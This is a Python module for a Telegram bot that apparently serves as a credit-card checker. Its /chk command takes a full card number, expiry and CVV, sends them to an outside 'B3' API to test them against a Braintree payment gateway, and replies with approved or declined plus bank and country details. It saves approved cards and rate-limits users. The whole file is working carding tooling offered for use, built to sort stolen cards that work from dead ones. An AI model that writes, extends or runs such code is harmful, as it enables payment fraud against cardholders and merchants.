# chk_command.py

from telethon import events
import asyncio
import aiohttp
import json
import time
import os
import aiofiles

# --- Globals ---
client = None
utils = {}
API_URL = "https://kamalxd.com/bots/b3/b3.php?cc={card}"
ANTISPAM_FILE = "antispam.json"
COOLDOWN_SECONDS = 30

# --- Anti-Spam Logic ---
async def handle_antispam(user_id):
    """
    Checks if a user is on cooldown.
    Returns (can_proceed: bool, time_left: int).
    """
    try:
        # Create the file if it doesn't exist
        if not os.path.exists(ANTISPAM_FILE):
            async with aiofiles.open(ANTISPAM_FILE, "w") as f:
                await f.write(json.dumps({}))
        
        # Read the spam data
        async with aiofiles.open(ANTISPAM_FILE, "r") as f:
            content = await f.read()
            spam_data = json.loads(content)

        current_time = time.time()
        user_last_time = spam_data.get(str(user_id), 0)

        time_elapsed = current_time - user_last_time
        if time_elapsed < COOLDOWN_SECONDS:
            time_left = round(COOLDOWN_SECONDS - time_elapsed)
            return False, time_left
        
        # Update user's timestamp and save
        spam_data[str(user_id)] = current_time
        async with aiofiles.open(ANTISPAM_FILE, "w") as f:
            await f.write(json.dumps(spam_data, indent=4))
        
        return True, 0

    except Exception as e:
        print(f"Error in antispam handler: {e}")
        # Allow the command to proceed in case of an error to not block the user
        return True, 0

# --- Core API Function ---
async def check_chk_api(card):
    """Makes a request to the B3 API."""
    try:
        url = API_URL.format(card=card)
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"status": "Error", "message": f"API HTTP Error {res.status}"}
                
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    status = data.get("status", "Unknown")
                    message = data.get("message", "No response message from API.")
                    
                    # If status is "Approved", change the message as requested
                    if status.lower() == "approved":
                        message = "payment added successfully"
                    
                    return {"status": status, "message": message}

                except json.JSONDecodeError:
                    return {"status": "Error", "message": "Invalid JSON response from API."}

    except asyncio.TimeoutError:
        return {"status": "Error", "message": "Request Timed Out"}
    except Exception as e:
        return {"status": "Error", "message": str(e)}

# --- Command Processing Logic ---
async def process_chk_card(event):
    """Processes a single card check for the /chk command."""
    card = utils['extract_card'](event.raw_text)
    if not card:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg and replied_msg.text:
                card = utils['extract_card'](replied_msg.text)
    
    if not card:
        return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /chk 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤")

    loading_msg = await event.reply("🍳")
    start_time = time.time()

    res = await check_chk_api(card)
    end_time = time.time()
    elapsed_time = round(end_time - start_time, 2)
    
    brand, bin_type, level, bank, country, flag = await utils['get_bin_info'](card.split("|")[0])
    
    status = res.get("status", "Error").lower()
    if status == "approved":
        status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        await utils['save_approved_card'](card, "APPROVED (B3)", res.get('message'), "Braintree", "N/A")
    elif status == "declined":
        status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
    else: 
        status_header = "𝙀𝙍𝙍𝙊𝙍 ⚠️"

    msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Braintree Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('message')}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝗸 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"""
    
    await loading_msg.delete()
    await event.reply(msg)

# --- Main Event Handler ---
async def chk_command(event):
    """Handler for the /chk command."""
    # 1. Check permissions first
    can_access, access_type = await utils['can_use'](event.sender_id, event.chat)
    if not can_access:
        if access_type == "banned":
            return await event.reply(utils['banned_user_message']())
        else:
            message, buttons = utils['access_denied_message_with_button']()
            return await event.reply(message, buttons=buttons)
    
    # 2. Check for spam
    can_proceed, time_left = await handle_antispam(event.sender_id)
    if not can_proceed:
        return await event.reply(f"⏳ **Anti-Spam:** Please wait **{time_left}** seconds before using this command again.")

    # 3. If all checks pass, process the command
    asyncio.create_task(process_chk_card(event))

# --- Registration Function ---
def register_handlers(_client, _utils):
    """Registers all the handlers and utilities from the main file."""
    global client, utils
    client = _client
    utils = _utils

    client.on(events.NewMessage(pattern=r'(?i)^[/.]chk'))(chk_command)
    print("✅ Successfully registered CHK command.")